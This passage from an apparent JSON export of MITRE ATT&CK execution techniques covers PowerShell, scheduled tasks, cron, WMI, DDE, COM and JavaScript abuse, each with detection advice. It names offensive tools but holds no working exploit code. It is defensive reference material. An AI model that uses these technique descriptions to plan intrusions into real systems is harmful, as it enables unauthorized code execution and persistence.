number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer. <\/p>\n<p>PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.<\/p>\n<p>Administrator permissions are required to use PowerShell to connect to remote systems.<\/p>\n<p>A number of PowerShell-based offensive testing tools are available, including <a href=\"https:\/\/attack.mitre.org\/software\/S0363\">Empire<\/a>,  PowerSploit, (Citation: Powersploit) and PSAttack. (Citation: Github PSAttack)<\/p>\n<p>PowerShell commands\/scripts can also be executed without directly invoking the powershell.exe binary through interfaces to PowerShell's underlying System.Management.Automation assembly exposed through the .NET framework and Windows Common Language Interface (CLI). (Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015) (Citation: Microsoft PSfromCsharp APR 2014)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":320,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":348,"name":"T1053 - Scheduled Task\/Job","sort_id":0,"external_id":"T1053","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":21,"description":"<p>Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically requires being a member of an admin or otherwise privileged group on the remote system.(Citation: TechNet Task Scheduler Security)<\/p>\n<p>Adversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions\/privileges).<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Look for changes to tasks that do not correlate with known software, patch cycles, etc. \n\nSuspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":348,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":348,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":348,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":357,"name":"T1035 - Service Execution","sort_id":0,"external_id":"T1035","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":21,"description":"<p>Adversaries may execute a binary, command, or script via a method that interacts with Windows services, such as the Service Control Manager. This can be done by either creating a new service or modifying an existing service. This technique is the execution used in conjunction with <a href=\"https:\/\/attack.mitre.org\/techniques\/T1050\">New Service<\/a> and <a href=\"https:\/\/attack.mitre.org\/techniques\/T1031\">Modify Existing Service<\/a> during service persistence or privilege escalation.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":357,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":367,"name":"T1153 - Source","sort_id":0,"external_id":"T1153","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":21,"description":"<p>The <code>source<\/code> command loads functions into the current shell or executes files in the current context. This built-in command can be run in two different ways <code>source \/path\/to\/filename [arguments]<\/code> or <code>. \/path\/to\/filename [arguments]<\/code>. Take note of the space after the &quot;.&quot;. Without a space, a new shell is created that runs the program instead of running the program within the current context. This is often used to make certain features or functions available to a shell or to update a specific shell's environment.(Citation: Source Manual)<\/p>\n<p>Adversaries can abuse this functionality to execute programs. The file executed with this technique does not need to be marked executable beforehand.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":367,"platform_id":1,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":367,"platform_id":2,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":393,"name":"T1072 - Software Deployment Tools","sort_id":0,"external_id":"T1072","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":21,"description":"<p>Adversaries may gain access to and use third-party software suites installed within an enterprise network, such as administration, monitoring, and deployment systems, to move laterally through the network. Third-party applications and software deployment systems may be in use in the network environment for administration purposes (e.g., SCCM, VNC, HBSS, Altiris, etc.).<\/p>\n<p>Access to a third-party network-wide or enterprise-wide software system may enable an adversary to have remote code execution on all systems that are connected to such a system. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.<\/p>\n<p>The permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required. However, the system may require an administrative account to log in or to perform it's intended purpose.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Detection methods will vary depending on the type of third-party software or system and how it is typically used. \n\nThe same investigation process can be applied here as with other potentially malicious activities where the distribution vector is initially unknown but the resulting activity follows a discernible pattern. Analyze the process execution trees, historical activities from the third-party application (such as what types of files are usually pushed), and the resulting activities or events from the file\/binary\/script pushed to systems. \n\nOften these third-party applications will have logs of their own that can be collected and correlated with other data from the environment. Ensure that third-party application logs are on-boarded to the enterprise logging system and the logs are regularly reviewed. Audit software deployment logs and look for suspicious or unauthorized activity. A system not typically used to push software to clients that suddenly is used for such a task outside of a known admin function may be suspicious. Monitor account login activity on these applications to detect suspicious\/abnormal usage.\n\nPerform application deployment at regular times so that irregular deployment activity stands out. Monitor process activity that does not correlate to known good software. Monitor account login activity on the deployment system.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":393,"platform_id":1,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":393,"platform_id":2,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":393,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":398,"name":"T1154 - Trap","sort_id":0,"external_id":"T1154","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":21,"description":"<p>The <code>trap<\/code> command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common  keyboard interrupts like <code>ctrl+c<\/code> and <code>ctrl+d<\/code>. Adversaries can use this to register code to be executed when the shell encounters specific interrupts either to gain execution or as a persistence mechanism. Trap commands are of the following format <code>trap 'command list' signals<\/code> where &quot;command list&quot; will be executed when &quot;signals&quot; are received.(Citation: Trap Manual)(Citation: Cyberciti Trap Statements)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":398,"platform_id":1,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":398,"platform_id":2,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":404,"name":"T1204 - User Execution","sort_id":0,"external_id":"T1204","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":21,"description":"<p>An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of <a href=\"https:\/\/attack.mitre.org\/techniques\/T1566\">Phishing<\/a>.<\/p>\n<p>While <a href=\"https:\/\/attack.mitre.org\/techniques\/T1204\">User Execution<\/a> frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after <a href=\"https:\/\/attack.mitre.org\/techniques\/T1534\">Internal Spearphishing<\/a>.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor the execution of and command-line arguments for applications that may be used by an adversary to gain Initial Access that require user interaction. This includes compression applications, such as those for zip files, that can be used to [Deobfuscate\/Decode Files or Information](https:\/\/attack.mitre.org\/techniques\/T1140) in payloads.\n\nAnti-virus can potentially detect malicious documents and files that are downloaded and executed on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the file is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning powershell.exe).","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":404,"platform_id":1,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":404,"platform_id":2,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":404,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":412,"name":"T1047 - Windows Management Instrumentation","sort_id":0,"external_id":"T1047","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":21,"description":"<p>Adversaries may abuse Windows Management Instrumentation (WMI) to achieve execution. WMI is a Windows administration feature that provides a uniform environment for local and remote access to Windows system components. It relies on the WMI service for local and remote access and the server message block (SMB) (Citation: Wikipedia SMB) and Remote Procedure Call Service (RPCS) (Citation: TechNet RPC) for remote access. RPCS operates over port 135. (Citation: MSDN WMI)<\/p>\n<p>An adversary can use WMI to interact with local and remote systems and use it as a means to perform many tactic functions, such as gathering information for Discovery and remote Execution of files as part of Lateral Movement. (Citation: FireEye WMI SANS 2015) (Citation: FireEye WMI 2015)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor network traffic for WMI connections; the use of WMI in environments that do not typically use WMI may be suspect. Perform process monitoring to capture command-line arguments of \"wmic\" and detect commands that are used to perform remote behavior. (Citation: FireEye WMI 2015)","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":412,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":414,"name":"T1028 - Windows Remote Management","sort_id":0,"external_id":"T1028","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":21,"description":"<p>Windows Remote Management (WinRM) is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services). (Citation: Microsoft WinRM) It may be called with the <code>winrm<\/code> command or by any number of programs such as PowerShell. (Citation: Jacobsen 2014)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":414,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":504,"name":"T1059.002 - AppleScript","sort_id":0,"external_id":"T1059.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":21,"description":"<p>Adversaries may abuse AppleScript for execution. AppleScript is a macOS scripting language designed to control applications and parts of the OS via inter-application messages called AppleEvents. (Citation: Apple AppleScript) These AppleEvent messages can be easily scripted with AppleScript for local or remote execution.<\/p>\n<p><code>osascript<\/code> executes AppleScript and any other Open Scripting Architecture (OSA) language scripts. A list of OSA languages installed on a system can be found by using the <code>osalang<\/code> program. AppleEvent messages can be sent independently or as part of a script. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely.<\/p>\n<p>Adversaries can use this to execute various behaviors, such as interacting with an open SSH connection, moving to remote machines, and even presenting users with fake dialog boxes. These events cannot start applications remotely (they can start them locally though), but can interact with applications if they're already running remotely. Since this is a scripting language, it can be used to launch more common techniques as well such as a reverse shell via <a href=\"https:\/\/attack.mitre.org\/techniques\/T1059\/006\">Python<\/a>(Citation: Macro Malware Targets Macs). Scripts can be run from the command-line via <code>osascript \/path\/to\/script<\/code> or <code>osascript -e &quot;script here&quot;<\/code>.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor for execution of AppleScript through osascript that may be related to other suspicious behavior occurring on the system.","platforms":[{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":504,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":515,"name":"T1053.001 - At (Linux)","sort_id":0,"external_id":"T1053.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":21,"description":"<p>Adversaries may abuse the <a href=\"https:\/\/attack.mitre.org\/software\/S0110\">at<\/a> utility to perform task scheduling for initial or recurring execution of malicious code. The <a href=\"https:\/\/attack.mitre.org\/software\/S0110\">at<\/a> command within Linux operating systems enables administrators to schedule tasks.(Citation: Kifarunix - Task Scheduling in Linux)<\/p>\n<p>An adversary may use <a href=\"https:\/\/attack.mitre.org\/software\/S0110\">at<\/a> in Linux environments to execute programs at system startup or on a scheduled basis for persistence. <a href=\"https:\/\/attack.mitre.org\/software\/S0110\">at<\/a> can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor scheduled task creation using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Look for changes to tasks that do not correlate with known software, patch cycles, etc. \n\nSuspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":515,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":516,"name":"T1053.002 - At (Windows)","sort_id":0,"external_id":"T1053.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":21,"description":"<p>Adversaries may abuse the <code>at.exe<\/code> utility to perform task scheduling for initial or recurring execution of malicious code. The <a href=\"https:\/\/attack.mitre.org\/software\/S0110\">at<\/a> utility exists as an executable within Windows for scheduling tasks at a specified time and date. Using <a href=\"https:\/\/attack.mitre.org\/software\/S0110\">at<\/a> requires that the Task Scheduler service be running, and the user to be logged on as a member of the local Administrators group. <\/p>\n<p>An adversary may use <code>at.exe<\/code> in Windows environments to execute programs at system startup or on a scheduled basis for persistence. <a href=\"https:\/\/attack.mitre.org\/software\/S0110\">at<\/a> can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account (such as SYSTEM).<\/p>\n<p>Note: The <code>at.exe<\/code> command line utility has been deprecated in current versions of Windows in favor of <code>schtasks<\/code>.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor process execution from the svchost.exe in Windows 10 and the Windows Task Scheduler taskeng.exe for older versions of Windows. (Citation: Twitter Leoloobeek Scheduled Task) If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in %systemroot%\\System32\\Tasks for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc.\n\nConfigure event logging for scheduled task creation and changes by enabling the \"Microsoft-Windows-TaskScheduler\/Operational\" setting within the event logging service. (Citation: TechNet Forum Scheduled Task Operational Setting) Several events will then be logged on scheduled task activity, including: (Citation: TechNet Scheduled Task Events)(Citation: Microsoft Scheduled Task Events Win10)\n\n* Event ID 106 on Windows 7, Server 2008 R2 - Scheduled task registered\n* Event ID 140 on Windows 7, Server 2008 R2 \/ 4702 on Windows 10, Server 2016 - Scheduled task updated\n* Event ID 141 on Windows 7, Server 2008 R2 \/ 4699 on Windows 10, Server 2016 - Scheduled task deleted\n* Event ID 4698 on Windows 10, Server 2016 - Scheduled task created\n* Event ID 4700 on Windows 10, Server 2016 - Scheduled task enabled\n* Event ID 4701 on Windows 10, Server 2016 - Scheduled task disabled\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks. (Citation: TechNet Autoruns)\n\nRemote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as [Windows Management Instrumentation](https:\/\/attack.mitre.org\/techniques\/T1047) and [PowerShell](https:\/\/attack.mitre.org\/techniques\/T1059\/001), so additional logging may need to be configured to gather the appropriate data.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":516,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":540,"name":"T1559.001 - Component Object Model","sort_id":0,"external_id":"T1559.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":21,"description":"<p>Adversaries may use the Windows Component Object Model (COM) for local code execution. COM is an inter-process communication (IPC) component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces.(Citation: Fireeye Hunting COM June 2019) Through COM, a client object can call methods of server objects, which are typically binary Dynamic Link Libraries (DLL) or executables (EXE).(Citation: Microsoft COM)<\/p>\n<p>Various COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and <a href=\"https:\/\/attack.mitre.org\/techniques\/T1059\/005\">Visual Basic<\/a>.(Citation: Microsoft COM) Specific COM objects also exist to directly perform functions beyond code execution, such as creating a <a href=\"https:\/\/attack.mitre.org\/techniques\/T1053\">Scheduled Task\/Job<\/a>, fileless download\/execution, and other adversary behaviors related to privilege escalation and persistence.(Citation: Fireeye Hunting COM June 2019)(Citation: ProjectZero File Write EoP Apr 2018)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor for COM objects loading DLLs and other modules not typically associated with the application.(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) Enumeration of COM objects, via [Query Registry](https:\/\/attack.mitre.org\/techniques\/T1012) or [PowerShell](https:\/\/attack.mitre.org\/techniques\/T1059\/001), may also proceed malicious use.(Citation: Fireeye Hunting COM June 2019)(Citation: Enigma MMC20 COM Jan 2017)\n\nMonitor for spawning of processes associated with COM objects, especially those invoked by a user different than the one currently logged on. ","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":540,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":558,"name":"T1053.003 - Cron","sort_id":0,"external_id":"T1053.003","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":21,"description":"<p>Adversaries may abuse the <code>cron<\/code> utility to perform task scheduling for initial or recurring execution of malicious code. The <code>cron<\/code> utility is a time-based job scheduler for Unix-like operating systems.  The <code> crontab<\/code> file contains the schedule of cron entries to be run and the specified times for execution. Any <code>crontab<\/code> files are stored in operating system-specific file paths.<\/p>\n<p>An adversary may use <code>cron<\/code> in Linux or Unix environments to execute programs at system startup or on a scheduled basis for persistence. <code>cron<\/code> can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Look for changes to tasks that do not correlate with known software, patch cycles, etc.  \n\nSuspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement. ","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":558,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":558,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":585,"name":"T1559.002 - Dynamic Data Exchange","sort_id":0,"external_id":"T1559.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":21,"description":"<p>Adversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and\/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.<\/p>\n<p>Object Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by <a href=\"https:\/\/attack.mitre.org\/techniques\/T1559\/001\">Component Object Model<\/a>, DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys. (Citation: BleepingComputer DDE Disabled in Word Dec 2017) (Citation: Microsoft ADV170021 Dec 2017) (Citation: Microsoft DDE Advisory Nov 2017)<\/p>\n<p>Microsoft Office documents can be poisoned with DDE commands (Citation: SensePost PS DDE May 2016) (Citation: Kettle CSV DDE Aug 2014), directly or through embedded files (Citation: Enigma Reviving DDE Jan 2018), and used to deliver execution via <a href=\"https:\/\/attack.mitre.org\/techniques\/T1566\">Phishing<\/a> campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros. (Citation: SensePost MacroLess DDE Oct 2017) DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to a <a href=\"https:\/\/attack.mitre.org\/techniques\/T1059\">Command and Scripting Interpreter<\/a>.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor processes for abnormal behavior indicative of DDE abuse, such as Microsoft Office applications loading DLLs and other modules not typically associated with the application or these applications spawning unusual processes (such as cmd.exe).\n\nOLE and Office Open XML files can be scanned for \u2018DDEAUTO', \u2018DDE\u2019, and other strings indicative of DDE execution.(Citation: NVisio Labs DDE Detection Oct 2017)","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":585,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":628,"name":"T1559 - Inter-Process Communication","sort_id":0,"external_id":"T1559","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":21,"description":"<p>Adversaries may abuse inter-process communication (IPC) mechanisms for local code or command execution. IPC is typically used by processes to share data, communicate with each other, or synchronize execution. IPC is also commonly used to avoid situations such as deadlocks, which occurs when processes are stuck in a cyclic waiting pattern. <\/p>\n<p>Adversaries may abuse IPC to execute arbitrary code or commands. IPC mechanisms may differ depending on OS, but typically exists in a form accessible through programming languages\/libraries or native interfaces such as Windows <a href=\"https:\/\/attack.mitre.org\/techniques\/T1559\/002\">Dynamic Data Exchange<\/a> or <a href=\"https:\/\/attack.mitre.org\/techniques\/T1559\/001\">Component Object Model<\/a>. Higher level execution mediums, such as those of <a href=\"https:\/\/attack.mitre.org\/techniques\/T1059\">Command and Scripting Interpreter<\/a>s, may also leverage underlying IPC mechanisms.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor for strings in files\/commands, loaded DLLs\/libraries, or spawned processes that are associated with abuse of IPC mechanisms.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":628,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":632,"name":"T1059.007 - JavaScript\/JScript","sort_id":0,"external_id":"T1059.007","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":21,"description":"<p>Adversaries may abuse JavaScript and\/or JScript for execution. JavaScript (JS) is a platform-agnostic scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.(Citation: NodeJS)<\/p>\n<p>JScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the <a href=\"https:\/\/attack.mitre.org\/techniques\/T1559\/001\">Component Object Model<\/a> and Internet Explorer HTML Application (HTA) pages.(Citation: JScrip May 2018)(Citation: Microsoft JScript 2007)(Citation: Microsoft Windows Scripts)<\/p>\n<p>Adversaries may abuse JavaScript \/ JScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a <a href=\"https:\/\/attack.mitre.org\/techniques\/T1189\">Drive-by Compromise<\/a> or downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as part of <a href=\"https:\/\/attack.mitre.org\/techniques\/T1027\">Obfuscated Files or Information<\/a>.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor for events associated with scripting execution, such as process activity, usage of the Windows Script Host (typically cscript.exe or wscript.exe), file activity involving scripts, or loading of modules associated with scripting languages (ex: JScript.dll). Scripting execution is likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for execution and subsequent behavior. Actions may be related to network and system information [Discovery](https:\/\/attack.mitre.org\/tactics\/TA0007), [Collection](https:\/\/attack.mitre.org\/tactics\/TA0009), or other programmable post-compromise behaviors and could be used as indicators of detection leading back to the source.\n\nUnderstanding standard usage patterns is important to avoid a high number 